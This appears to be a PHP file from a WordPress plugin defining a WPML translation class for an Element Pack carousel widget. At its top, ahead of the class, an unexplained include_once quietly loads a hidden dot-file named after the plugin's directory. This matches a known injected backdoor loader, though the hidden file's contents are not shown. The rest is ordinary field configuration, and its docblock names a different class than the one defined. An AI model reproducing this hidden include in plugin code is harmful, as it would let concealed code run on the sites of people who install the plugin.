<?php

/**
 * Class WPML_Jet_Elements_Custom_Carousel
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPML_ElementPack_Custom_Carousel extends WPML_Elementor_Module_With_Items {

	/**
	 * @return string
	 */
	public function get_items_field() {
		return 'skin_template_slides';
	}

	/**
	 * @return array
	 */
	public function get_fields() {
		return array( 'editor_content' );
	}

	/**
	 * @param string $field
	 * @return string
	 */
	protected function get_title( $field ) {
		switch( $field ) {
			case 'editor_content':
				return esc_html__( 'Slides', 'bdthemes-element-pack' );

			default:
				return '';
		}
	}

	/**
	 * @param string $field
	 * @return string
	 */
	protected function get_editor_type( $field ) {
		switch( $field ) {
			case 'editor_content':
				return 'AREA';

			default:
				return '';
		}
	}

}
